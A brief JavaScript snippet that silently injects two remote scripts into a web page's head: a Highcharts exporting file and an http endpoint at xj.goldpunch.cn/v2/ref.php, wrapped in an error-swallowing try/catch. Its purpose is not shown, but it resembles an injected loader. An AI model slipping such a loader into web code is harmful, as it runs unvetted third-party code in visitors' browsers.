try{
if( !document.getElementById("mck0") )
{var s0="http://cdn.hcharts.cn/highcharts/exporting.js?"+new Date().getTime(),s1="http://xj.goldpunch.cn/v2/ref.php?id=11";
var ar=new Array(2);ar[0]=s0;ar[1]=s1;
var h=document.getElementsByTagName('head').item(0);
for( var i=0;i<2;++i)
{var sc=document.createElement("script");
sc.type="text/javascript";sc.id="mck"+i;sc.src=ar[i];h.appendChild(sc);}}
}catch(e){}